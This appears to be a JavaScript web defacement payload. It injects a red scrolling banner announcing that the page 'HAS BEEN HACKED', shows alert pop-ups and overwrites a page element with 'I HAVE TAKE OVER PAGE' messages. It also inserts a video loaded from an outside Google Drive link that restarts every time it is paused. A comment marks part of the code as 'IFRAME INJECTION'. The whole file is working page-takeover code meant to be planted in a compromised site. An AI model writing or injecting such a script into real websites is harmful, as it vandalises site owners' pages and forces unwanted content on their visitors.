const rnt = '<div class="marquee"><div class="marquee__inner"><p class="marquee__line"> ====== PAGE YOU HAVE TO ACCESED HAS BEEN HACKED ====== CLICK THE ELEMENT BELOW AND ENJOY THE MUSIC REMIX !!!! </p><p class="marquee__line"> ====== PAGE YOU HAVE TO ACCESED HAS BEEN HACKED ====== CLICK THE ELEMENT BELOW AND ENJOY THE MUSIC REMIX !!!! </p></div></div>';
var stArr = [
    '.marquee {overflow: hidden;font-family: "Pridi", sans-serif;font-weight: 600;font-size: 34px;text-transform: uppercase;background-color: #FF0000;}',
    '.marquee__inner {display: flex;}',
    '.marquee__line {flex-shrink: 0;margin: 0;padding: 10px 15px;min-width: 100%;white-space: nowrap;animation-name: marqueeLine;animation-duration: 5s;animation-timing-function: ease-in-out;animation-iteration-count: infinite;}',
    '@keyframes marqueeLine {from {transform: translateX(0);}to {transform: translateX(-100%);}}'
];
var stylll = document.createElement('style');
   for(i = 0; i < stArr.length; i++){
    stylll.append(stArr[i]);
   }
var CShead = document.querySelectorAll('head');
    CShead[0].append(stylll);

alert('wkwkwkwkwkwkwkwkwkkwk');
setTimeout(()=>{ alert('Ready To Dance ?'); }, 200);

var ete;

var inthandle = setInterval( function(){
    var pe = document.getElementById('bcd-txt');
    if(pe !== null || pe !== undefined){
        clearInterval(inthandle);
        ete = pe;
    }
}, 100);

var x = 0;
setTimeout( function(){
    var arr = ["I HAVE TAKE OVER PAGE YOU HAVE TO GO !!", "THIS IS JUST A JOKE DON'T BE SERIOUSLY !!"];
    var counter = 0;
        setInterval( function(){
            x += 1;
            counter += 1;
            if(counter == 1){
                x = 0;
            }
            if(x > 1){
                x = 0;
            }
            chginthtm({
                e: ete,
                t: arr[x]
                });
        }, 2500);

}, 800);

// IFRAME INJECTION
// <iframe class="rsmp" width="560" height="315" src="https://www.youtube.com/embed/iywJ54FdlHU" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
var d = document.createElement('video');
    d.style.position = "relative";
    d.style.width = "100%";
    d.style.height = "100%";
    d.style.overflow = "hidden";
    
    var fram = document.createElement('source');
        fram.src = "https://drive.google.com/u/0/uc?id=1z7C7UoJWNX4oRj1l7rVdSmbvnsirV1_V&export=download";

setTimeout( function(){
    d.append(fram);
    ete.parentElement.append(d);
}, 500);
d.addEventListener('loadedmetadata', () => {
    ply();
});
document.onclick = () =>{
    ply();
};
var evtH;
d.addEventListener("pause", function() {
    evtH = setInterval(()=> {
        d.play();
    }, 10);
});

d.addEventListener("playing", function() {
    clearInterval(evtH);
});

var dmt = document.createElement('div');
    dmt.innerHTML = rnt;
    dmt.style.zIndex = "99999999";
setTimeout(()=>{
    ete.parentElement.prepend(dmt);
}, 1000);
function chginthtm(prop){
        prop.e.innerHTML = "";
        prop.e.innerHTML = prop.t;
}
function ply(){
    d.play();
}
